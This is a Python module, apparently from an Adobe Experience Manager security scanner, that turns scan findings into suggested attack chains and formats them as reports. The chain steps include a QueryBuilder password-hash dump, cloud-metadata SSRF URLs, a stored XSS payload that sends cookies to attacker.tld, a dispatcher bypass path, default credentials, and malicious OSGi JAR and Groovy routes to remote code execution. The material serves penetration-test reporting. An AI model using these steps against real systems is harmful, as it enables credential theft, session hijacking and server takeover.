"""
Attack Chaining Strategy
========================
Analyses the collected findings and suggests workflows to escalate low-impact
discoveries into high-impact attack chains.

Each `ChainSuggestion` maps a set of prerequisite finding categories/check IDs
to an escalation goal with a concrete exploitation narrative.
"""
from __future__ import annotations

import dataclasses
from typing import Dict, List, Optional, Tuple

from .models import Finding


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

@dataclasses.dataclass
class ChainSuggestion:
    """Describes a potential attack chain derived from current findings."""

    chain_id: str
    title: str
    impact: str                   # "critical", "high", "medium"

    # The prerequisite findings that enable this chain
    prerequisite_check_ids: List[str]
    prerequisite_categories: List[str]

    # Step-by-step exploitation narrative
    steps: List[str]

    # Associated findings that triggered this chain
    triggered_by: List[str] = dataclasses.field(default_factory=list)

    # Optional tool/technique reference
    references: List[str] = dataclasses.field(default_factory=list)


# ---------------------------------------------------------------------------
# Chain definitions
# ---------------------------------------------------------------------------

_CHAIN_DEFINITIONS: List[Dict] = [
    # -----------------------------------------------------------------------
    # Chain 1: QueryBuilder JCR dump → credential extraction → auth escalation
    # -----------------------------------------------------------------------
    {
        "chain_id": "CHAIN-001",
        "title": "QueryBuilder Information Disclosure → Credential Extraction",
        "impact": "critical",
        "prerequisite_check_ids": ["AEM-QB-001"],
        "prerequisite_categories": ["querybuilder_dump"],
        "steps": [
            "1. Confirm /bin/querybuilder.json is accessible without authentication.",
            "2. Query user nodes: GET /bin/querybuilder.json?path=/home/users&type=rep:User&p.limit=50&p.hits=full",
            "3. Extract rep:password hashes or plaintext credentials from the JSON response.",
            "4. If hashes are present, identify the algorithm (usually SHA-256 with salt) and crack offline.",
            "5. Use recovered credentials against /system/console, /crx/de, or /crx/packmgr.",
            "6. If author/admin access is achieved, deploy a malicious OSGi bundle or Groovy script for RCE.",
        ],
        "references": [
            "https://experienceleague.adobe.com/docs/experience-manager-65/developing/platform/query-builder/querybuilder-api.html",
            "CVE-2019-8086 (Authentication bypass via querybuilder)",
        ],
    },
    # -----------------------------------------------------------------------
    # Chain 2: Component path exposure → LinkChecker SSRF
    # -----------------------------------------------------------------------
    {
        "chain_id": "CHAIN-002",
        "title": "Component Path Information Leak → LinkChecker Out-of-Band SSRF",
        "impact": "high",
        "prerequisite_check_ids": ["AEM-SSRF-001"],
        "prerequisite_categories": ["ssrf", "linkchecker"],
        "steps": [
            "1. Obtain the OOB SSRF hit from /etc/linkchecker.html probing.",
            "2. Use the SSRF to enumerate internal cloud-metadata endpoints:",
            "   - AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "   - GCP:   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "   - Azure: http://169.254.169.254/metadata/identity/oauth2/token",
            "3. Chain IAM credential leak into lateral movement within the cloud environment.",
            "4. If internal AEM publish/author is running on a private port, SSRF can be used to bypass",
            "   dispatcher and hit /system/console or /crx/de directly.",
            "5. Leak internal service credentials stored in OSGI configs via SSRF to /system/console/configMgr.json",
        ],
        "references": [
            "CWE-918 Server-Side Request Forgery",
            "https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/",
        ],
    },
    # -----------------------------------------------------------------------
    # Chain 3: Sling POST unauthorized write → Stored XSS
    # -----------------------------------------------------------------------
    {
        "chain_id": "CHAIN-003",
        "title": "Sling POST Unauthorized Write → Stored XSS via User-Generated Content",
        "impact": "high",
        "prerequisite_check_ids": ["AEM-SLING-001", "AEM-ACT-100"],
        "prerequisite_categories": ["sling_post", "active_testing"],
        "steps": [
            "1. Confirm write access to /content/usergenerated or /content/dam via the Sling POST servlet.",
            "2. Create a node with a property containing an XSS payload:",
            "   POST /content/usergenerated/xss-poc",
            "   Body: jcr:primaryType=nt:unstructured&message=<script>fetch('https://attacker.tld/?c='+document.cookie)</script>",
            "3. Identify the page that renders user-generated content (e.g., Community forums, Review widgets).",
            "4. Browse to the rendered page — if the property is reflected without encoding, XSS fires.",
            "5. For Admin-targeted XSS: find an Author-side view that lists /content/dam nodes as HTML.",
            "6. Escalate to session hijacking of an administrator using the cookie exfiltration payload.",
        ],
        "references": [
            "CWE-79 Cross-site Scripting",
            "https://experienceleague.adobe.com/docs/experience-manager-65/administering/security/security.html",
        ],
    },
    # -----------------------------------------------------------------------
    # Chain 4: Dispatcher bypass → Admin console access → RCE
    # -----------------------------------------------------------------------
    {
        "chain_id": "CHAIN-004",
        "title": "Dispatcher Path Bypass → Felix/OSGi Console → Remote Code Execution",
        "impact": "critical",
        "prerequisite_check_ids": ["AEM-DISP-001", "AEM-DISP-002"],
        "prerequisite_categories": ["dispatcher"],
        "steps": [
            "1. Use the confirmed bypass variant to reach /system/console (Apache Felix OSGi console).",
            "   Example bypass: /content/..;/system/console",
            "2. Attempt default credentials: admin:admin, admin:Password1, anonymous:anonymous.",
            "3. If authenticated, navigate to /system/console/bundles and upload a malicious OSGi JAR.",
            "4. The JAR activator executes on install — use it to spawn a reverse shell or write a JSP webshell.",
            "5. Alternatively, use /system/console/cq (login) then /etc/groovyconsole (if ACS Commons installed)",
            "   to execute arbitrary Groovy scripts: 'id'.execute().text",
            "6. Use /bin/querybuilder.json to map the repository before extracting credentials from OSGI configs.",
        ],
        "references": [
            "CVE-2016-0957 (Dispatcher bypass)",
            "https://github.com/0ang3el/aem-hacker",
        ],
    },
    # -----------------------------------------------------------------------
    # Chain 5: Selector info-disclosure → token harvest → CSRF bypass
    # -----------------------------------------------------------------------
    {
        "chain_id": "CHAIN-005",
        "title": "Selector Information Disclosure → Granite CSRF Token Harvest → Account Takeover",
        "impact": "high",
        "prerequisite_check_ids": ["AEM-SEL-001", "AEM-ACT-001"],
        "prerequisite_categories": ["selector_bypass", "dispatcher"],
        "steps": [
            "1. Confirm info disclosure via .json / .infinity.json selectors on content nodes.",
            "   Example: GET /home/users/admin.infinity.json",
            "2. Extract email addresses, user paths, or auth tokens from the JSON dump.",
            "3. Use /libs/granite/csrf/token.json to obtain a valid CSRF token (requires a session cookie).",
            "4. If the application has a 'Create Customer' or 'Registration' endpoint, POST with the",
            "   harvested token to create a privileged account or modify an existing user's properties.",
            "5. Alternatively, chain the CSRF token with state-changing Sling POST calls.",
            "   POST /home/users/<target>@PropertyChange with token in header X-CSRF-Token.",
        ],
        "references": [
            "CWE-352 Cross-Site Request Forgery",
            "https://experienceleague.adobe.com/docs/experience-manager-65/developing/introduction/csrf-protection.html",
        ],
    },
    # -----------------------------------------------------------------------
    # Chain 6: DAM metadata exposure → SSRF via replication agent
    # -----------------------------------------------------------------------
    {
        "chain_id": "CHAIN-006",
        "title": "Replication Agent Exposure → SSRF / Internal Network Pivot",
        "impact": "high",
        "prerequisite_check_ids": [],
        "prerequisite_categories": ["replication"],
        "steps": [
            "1. Identify accessible replication agent configuration at /etc/replication/agents.author.",
            "2. If writable (authenticated), modify the transport URI of the Default Agent to point to",
            "   an internal service: e.g., http://internal-db:5432/ or http://169.254.169.254/",
            "3. Trigger replication (POST queue flush or content activation) to force the AEM server",
            "   to send a request to the internal target.",
            "4. Monitor OOB collector for the outbound request proving SSRF.",
            "5. Read the response body via /etc/replication/agents.author/<agent>.queue if accessible.",
        ],
        "references": [
            "CWE-918 Server-Side Request Forgery",
        ],
    },
]


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

def evaluate_chains(findings: List[Finding]) -> List[ChainSuggestion]:
    """
    Compare collected findings against chain definitions.
    Returns a list of applicable chains, ordered by impact.

    A chain is triggered when at least one prerequisite check_id or category
    matches a finding in the scan report.
    """
    _IMPACT_ORDER = {"critical": 3, "high": 2, "medium": 1}

    # Build lookup sets from findings
    found_check_ids = {f.check_id for f in findings}
    found_categories = {f.category for f in findings}

    triggered: List[ChainSuggestion] = []

    for defn in _CHAIN_DEFINITIONS:
        matched_ids = found_check_ids.intersection(defn["prerequisite_check_ids"])
        matched_cats = found_categories.intersection(defn["prerequisite_categories"])

        if not matched_ids and not matched_cats:
            continue

        triggered_by: List[str] = []
        for f in findings:
            if f.check_id in matched_ids or f.category in matched_cats:
                triggered_by.append(
                    f"{f.check_id}:{f.title[:60]} (sev={f.severity})"
                )

        triggered.append(
            ChainSuggestion(
                chain_id=defn["chain_id"],
                title=defn["title"],
                impact=defn["impact"],
                prerequisite_check_ids=defn["prerequisite_check_ids"],
                prerequisite_categories=defn["prerequisite_categories"],
                steps=defn["steps"],
                triggered_by=triggered_by[:5],
                references=defn.get("references", []),
            )
        )

    triggered.sort(key=lambda c: _IMPACT_ORDER.get(c.impact, 0), reverse=True)
    return triggered


def format_chains_terminal(chains: List[ChainSuggestion]) -> str:
    """Render chains as terminal-friendly text."""
    if not chains:
        return "\nNo applicable attack chains identified from current findings."

    lines: List[str] = ["\n=== Attack Chain Suggestions ==="]
    for chain in chains:
        lines.append(f"\n[{chain.impact.upper()}] {chain.chain_id} | {chain.title}")
        lines.append(f"  Triggered by:")
        for tb in chain.triggered_by:
            lines.append(f"    - {tb}")
        lines.append(f"  Exploitation steps:")
        for step in chain.steps:
            lines.append(f"    {step}")
        if chain.references:
            lines.append(f"  References:")
            for ref in chain.references:
                lines.append(f"    * {ref}")
    return "\n".join(lines)


def format_chains_markdown(chains: List[ChainSuggestion]) -> str:
    """Render chains as Markdown."""
    if not chains:
        return "\n## Attack Chain Suggestions\n\nNo applicable chains identified.\n"

    lines: List[str] = ["\n## Attack Chain Suggestions\n"]
    for chain in chains:
        lines.append(f"### [{chain.impact.upper()}] {chain.chain_id} — {chain.title}\n")
        lines.append("**Triggered by findings:**\n")
        for tb in chain.triggered_by:
            lines.append(f"- `{tb}`")
        lines.append("\n**Exploitation steps:**\n")
        for step in chain.steps:
            lines.append(step)
        if chain.references:
            lines.append("\n**References:**\n")
            for ref in chain.references:
                lines.append(f"- {ref}")
        lines.append("")
    return "\n".join(lines)
